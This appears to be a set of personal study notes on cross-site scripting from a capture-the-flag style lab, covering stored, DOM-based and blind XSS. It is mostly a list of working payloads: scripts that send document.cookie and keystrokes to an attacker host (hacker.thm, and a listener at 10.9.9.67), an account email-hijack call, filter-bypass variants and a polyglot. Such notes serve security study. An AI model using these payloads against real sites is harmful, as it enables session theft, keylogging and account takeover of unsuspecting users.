# XSS Payloads

Proof Of Concept:

```

<script>alert('XSS');</script>

```

Session Stealing:

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```


Key Logger: ^dbf09c

```

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

```

Business Logic:

```

<script>user.changeEmail('attacker@hacker.thm');</script>


```

# Stored XSS

A blog `website` that **allows users to post comments.** Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be **stored in the database**, and every other user now visiting the article will have the JavaScript **run in their browser**.

# DOM Based XSS

DOM Based XSS is where the JavaScript execution happens **directly in the browser** without any new pages being loaded or data submitted to backend code. `Execution occurs` when the website JavaScript code acts on **input or user interaction**


The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. **The contents of the hash aren't checked** for malicious code, allowing an **attacker to inject JavaScript**of their choosing onto the webpage.

```

<sscriptcript>alert('THM');</sscriptcript>

```

```
"><script>alert('THM');</script> 

```

To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event
```

<img src="/images/cat.jpg" onload="alert('THM');">

```

You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters

Unsafe JavaScript method is good to look  `eval()`

# Blind XSS
[xsshunter](https://xsshunter.com/)

## input
```

"><script>alert('THM');</script>

```
## textarea

```
</textarea><script>alert('THM');</script>

```

## Polyglots:

```
jaVasCript:/*/*`/*\`/*'/*"/**/(/**/onerror=alert('THM'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

```

# Blind XSS
```
python3 -m http.server 8000

```

```
</textarea><script>fetch('http://10.9.9.67:8000/?cookie=' + btoa(document.cookie));</script>

```